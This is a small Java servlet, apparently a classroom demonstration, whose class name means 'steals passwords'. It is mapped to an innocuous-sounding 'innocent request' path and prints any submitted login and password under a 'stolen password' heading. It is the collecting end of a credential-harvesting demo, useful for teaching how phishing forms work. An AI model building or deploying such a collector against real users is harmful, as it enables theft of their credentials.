package com.curso.controlador;

import java.io.IOException;

import javax.servlet.ServletException;
import javax.servlet.annotation.WebServlet;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;

@WebServlet("/peticion_inocente")
public class SVRobaPasswords extends HttpServlet {
	private static final long serialVersionUID = 1L;
       
    public SVRobaPasswords() {
        super();
    }

	protected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {

		System.out.println("Contraseña robada:");
		System.out.println("Login   :"+request.getParameter("login"));
		System.out.println("Password:"+request.getParameter("pw"));

	}

}
